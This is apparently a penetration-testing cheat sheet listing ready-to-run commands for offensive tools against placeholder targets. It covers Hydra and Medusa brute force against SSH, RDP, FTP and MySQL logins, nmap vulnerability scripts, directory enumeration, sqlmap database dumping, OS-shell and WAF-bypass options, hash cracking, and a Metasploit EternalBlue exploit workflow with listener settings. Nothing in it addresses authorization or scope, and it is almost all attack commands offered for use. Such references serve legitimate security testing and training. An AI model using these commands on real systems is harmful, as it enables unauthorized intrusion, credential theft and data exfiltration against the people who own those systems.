# Security Tools Configuration & Usage Guide

## Table of Contents
- [Brute Force Tools](#brute-force-tools)
- [Network Scanning](#network-scanning)
- [Web Scanning](#web-scanning)
- [Exploitation](#exploitation)
- [Analysis Tools](#analysis-tools)
- [Tips & Tricks](#tips--tricks)

---

## Brute Force Tools

### Hydra - Network Logon Cracker

**Installation**:
```bash
sudo apt install hydra
```

**Wordlists**:
```
/usr/share/wordlists/rockyou.txt    # Common passwords
/usr/share/wordlists/fasttrack.txt  # Fast testing
```

**Common Examples**:

```bash
# HTTP POST Login
hydra -l admin -P wordlist.txt -s 80 example.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=login failed"

# HTTP GET
hydra -l admin -P wordlist.txt example.com http-get /admin

# SSH Brute Force
hydra -l root -P wordlist.txt -o ssh_results.txt ssh://192.168.1.1

# FTP
hydra -l admin -P wordlist.txt -o ftp_results.txt ftp://example.com

# MySQL
hydra -l root -P wordlist.txt -s 3306 192.168.1.1 mysql

# SMTP
hydra -l user@example.com -P wordlist.txt -s 25 mail.example.com smtp

# RDP
hydra -l administrator -P wordlist.txt -s 3389 192.168.1.1 rdp
```

**Options**:
```bash
-l      # Single login
-L      # Login list file
-p      # Single password
-P      # Password list file
-t      # Number of parallel threads
-s      # Port number
-S      # SSL connection
-o      # Output file
-V      # Verbose
-f      # Exit on first found
```

---

### Medusa - Parallel Network Login Auditor

**Installation**:
```bash
sudo apt install medusa
```

**Usage Examples**:

```bash
# List available modules
medusa -d

# SSH testing
medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ssh

# HTTP testing
medusa -h example.com -u admin -P wordlist.txt -M http

# FTP testing
medusa -h ftp.example.com -u admin -P wordlist.txt -M ftp \
  -n 22 -e ns -v 5

# MySQL
medusa -h 192.168.1.1 -u root -P wordlist.txt -M mysql \
  -n 3306 -v 5
```

**Features**:
- Parallel login attempts
- Multiple module support
- Proxy support
- Custom output formats

---

## Network Scanning

### Nmap - Network Mapper

**Installation**:
```bash
sudo apt install nmap
```

**Basic Scans**:

```bash
# Ping scan (host discovery)
nmap -sn 192.168.1.0/24

# Port scan (top 1000 ports)
nmap 192.168.1.1

# All ports
nmap -p- 192.168.1.1

# Specific ports
nmap -p 22,80,443 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1
```

**Advanced Scanning**:

```bash
# TCP SYN scan (stealthy)
nmap -sS 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Script scanning
nmap --script default 192.168.1.1

# Vulnerability scanning scripts
nmap --script vuln 192.168.1.1

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 example.com

# SMB enumeration
nmap --script smb-os-discovery -p 445 192.168.1.1
```

**Useful Scripts**:
```bash
nmap --script smb-vuln-* -p 445 192.168.1.1           # SMB vulnerabilities
nmap --script http-vuln-* -p 80,443 example.com       # HTTP vulnerabilities
nmap --script ssh-* -p 22 192.168.1.1                 # SSH information
nmap --script dns-brute -p 53 example.com             # DNS enumeration
```

**Output Formats**:
```bash
-oN file.txt    # Normal
-oX file.xml    # XML
-oG file.gnmap  # Greppable
-oA file        # All formats
```

---

## Web Scanning

### Nikto - Web Server Scanner

**Installation**:
```bash
sudo apt install nikto
```

**Usage**:

```bash
# Basic scan
nikto -h example.com

# Scan specific port
nikto -h example.com -p 8080

# HTTPS
nikto -h example.com -p 443 -ssl

# Custom user agent
nikto -h example.com -useragent "Mozilla/5.0"

# Specify plugins
nikto -h example.com -Plugins '@@DEFAULT;-DOSdb;-Upload;-GitDir'

# Output to file
nikto -h example.com -o report.html -Format html
```

**Output Formats**:
- HTML
- TXT
- CSV
- JSON

---

### Gobuster - Directory Enumeration

**Installation**:
```bash
sudo apt install gobuster
```

**Usage**:

```bash
# Directory busting
gobuster dir -u http://example.com -w wordlist.txt

# Show status codes
gobuster dir -u http://example.com -w wordlist.txt -s 200,204,301,302

# Specific extensions
gobuster dir -u http://example.com -w wordlist.txt -x .php,.html,.txt

# Recursive
gobuster dir -u http://example.com -w wordlist.txt -r

# Timeout
gobuster dir -u http://example.com -w wordlist.txt --timeout 10s

# Threads
gobuster dir -u http://example.com -w wordlist.txt -t 50

# DNS enumeration
gobuster dns -d example.com -w wordlist.txt

# HTTPS
gobuster dir -u https://example.com -w wordlist.txt -k
```

---

### Dirb - Web Content Discovery

**Installation**:
```bash
sudo apt install dirb
```

**Usage**:

```bash
# Basic scan
dirb http://example.com

# Custom wordlist
dirb http://example.com /path/to/wordlist.txt

# Cookie
dirb http://example.com -c "COOKIE=value"

# HTTP method
dirb http://example.com -m OPTIONS

# Extensions
dirb http://example.com -X .php,.html,.txt

# Proxy
dirb http://example.com -p proxy:port

# Output
dirb http://example.com -o results.txt
```

---

## SQL Injection

### SQLMap - Automated SQL Injection Tool

**Installation**:
```bash
sudo apt install sqlmap
```

**Usage**:

```bash
# Basic test
sqlmap -u "http://example.com/page?id=1" --dbs

# POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=pass" --dbs

# Cookie
sqlmap -u "http://example.com/profile" --cookie="PHPSESSID=abc123" --dbs

# Extract specific database
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# Extract table data
sqlmap -u "http://example.com/page?id=1" \
  -D database_name \
  -T table_name \
  --dump

# Get OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# Custom injection point
sqlmap -u "http://example.com/page?id=1*" --dbs

# Bypass WAF
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment --dbs
```

**Tamper Scripts**:
```bash
--tamper=space2comment        # Space to comment
--tamper=space2plus           # Space to +
--tamper=between              # Use BETWEEN
--tamper=charencode           # Hex encode
--tamper=randomcase           # Random case
```

---

## Password Cracking

### John the Ripper

**Installation**:
```bash
sudo apt install john
```

**Usage**:

```bash
# Crack hashes
john hashes.txt

# Specify hash format
john --format=md5 hashes.txt

# Dictionary attack
john --wordlist=wordlist.txt hashes.txt

# Brute force
john --incremental=Alnum hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=sha512crypt hashes.txt
```

### Hashcat

**Installation**:
```bash
sudo apt install hashcat
```

**Usage**:

```bash
# MD5 hashes
hashcat -m 0 hashes.txt wordlist.txt

# SHA1 hashes
hashcat -m 100 hashes.txt wordlist.txt

# SHA256 hashes
hashcat -m 1400 hashes.txt wordlist.txt

# bcrypt hashes
hashcat -m 3200 hashes.txt wordlist.txt

# Brute force
hashcat -m 0 hashes.txt -a 3 ?l?l?l?l?l?l?l?l

# GPU acceleration
hashcat -m 0 hashes.txt wordlist.txt -d 1 -D 3
```

---

## Exploitation

### Metasploit Framework

**Installation**:
```bash
sudo apt install metasploit-framework
```

**Basic Workflow**:

```bash
# Start console
msfconsole

# Search exploits
search windows/smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set required options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set LPORT 4444

# View exploit info
info

# Run exploit
exploit
```

---

## Analysis Tools

### Network Analysis - Wireshark

**Installation**:
```bash
sudo apt install wireshark
```

**Command-line (tshark)**:

```bash
# Capture packets
sudo tshark -i eth0 -w capture.pcap

# Read capture file
tshark -r capture.pcap

# Filter by protocol
tshark -r capture.pcap -Y "http"

# Filter by IP
tshark -r capture.pcap -Y "ip.src == 192.168.1.1"
```

---

## Tips & Tricks

### Creating Wordlists

```bash
# Generate wordlist with crunch
crunch 8 8 0123456789 > numbers.txt

# Common patterns
crunch 6 8 abcdefghijklmnopqrstuvwxyz > passwords.txt

# Use existing list
cat /usr/share/wordlists/rockyou.txt | head -1000 > limited.txt
```

### Chaining Tools

```bash
# 1. Find open ports
nmap -p- 192.168.1.1 > nmap_results.txt

# 2. Test web server
nikto -h example.com > nikto_results.txt

# 3. Enumerate directories
gobuster dir -u http://example.com -w wordlist.txt

# 4. Test for SQL injection
sqlmap -u "http://example.com/search?q=test" --dbs

# 5. Generate report
cat *_results.txt > security_report.txt
```

### Time-Efficient Testing

```bash
# Quick port scan (top 1000)
nmap -T4 192.168.1.1

# Fast web scan
nikto -h example.com -Plugins '@@DEFAULT;-DOSdb'

# Limited wordlist
head -1000 /usr/share/wordlists/rockyou.txt > limited.txt
gobuster dir -u http://example.com -w limited.txt
```

### Output Management

```bash
# Combine results
cat nikto_results.txt nmap_results.txt > combined_report.txt

# Create HTML report
(echo "<html><body>"; cat *.txt; echo "</body></html>") > report.html

# Grep for critical issues
grep -i "critical\|high\|severe" *_results.txt > critical_findings.txt
```

---

## Tool Comparison

| Tool | Purpose | Strengths | Limitations |
|------|---------|-----------|-------------|
| Hydra | Brute Force | Fast, multi-protocol | Requires valid usernames |
| Nmap | Network Scanning | Comprehensive, detailed | Requires network access |
| Nikto | Web Scanning | Quick, effective | Limited vulnerability depth |
| SQLMap | SQL Injection | Automated | May trigger alerts |
| Metasploit | Exploitation | Complete framework | Steep learning curve |
| Gobuster | Directory Enum | Fast, parallelized | Wordlist dependent |
| John | Password Cracking | Flexible formats | Slower than GPU tools |

---

**Last Updated**: May 2024
